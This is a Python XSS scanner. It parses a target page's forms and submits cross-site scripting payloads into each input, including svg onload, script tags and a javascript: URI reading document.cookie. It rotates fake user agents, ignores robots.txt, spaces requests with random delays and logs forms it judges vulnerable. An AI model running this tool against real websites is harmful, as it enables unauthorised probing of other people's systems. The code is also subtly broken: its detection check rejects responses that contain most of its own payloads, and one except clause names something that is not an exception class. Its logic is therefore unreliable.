import time
import random
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
from colorama import Fore
import mechanize
import re
import urllib
 
def scan(url: str):
    ua = UserAgent()
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    browser.set_handle_refresh(False)
    response = browser.open(url)
    
    soup = BeautifulSoup(response.read(), "html.parser")
    forms = soup.find_all("form")

    xss_found = []
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()

        inputs = form.find_all("input")

        payload = ['"><svg onload=alert(1)>', '<script>alert(1)</script>', 'javascript:alert(document.cookie)',
                '"onmouseover="alert(1)']

        data = {}
        for input_field in inputs:
            name = input_field.get("name")
            value = input_field.get("value", "")

            data[name] = value

            for payloads in payload:
                data[name] = payloads

                try:
                    browser.addheaders = [('User-agent', ua.random)]
                    if method == "post":
                        response = browser.open(action, data=data)
                    else:
                        response = browser.open(action + "?" + urllib.parse.urlencode(data))
                except (TypeError, mechanize._mechanize.BrowserStateError):
                    pass
                except mechanize.HTTPError:
                    pass
                except mechanize._response.get_seek_wrapper:
                    pass
                else:
                    response_text = response.read().decode("utf-8")
                    if payloads in response_text and not re.search(r'<svg|<script|onmouseover', response_text, re.IGNORECASE):
                        xss_found.append(payloads)

                        with open("output/xss.txt", "a") as f:
                            f.write(f"--Vulnerable Form--\n\n")
                            f.write(f"Payload: {payloads}\n\n")
                            f.write(f"{form}\n\n")
                    else:
                        pass
        time.sleep(random.randint(1, 3))  # Add a random delay between requests

    if xss_found:
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS Found: {Fore.MAGENTA}{len(xss_found)}")
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS Vulnerable Form: {Fore.MAGENTA}saved to /output")
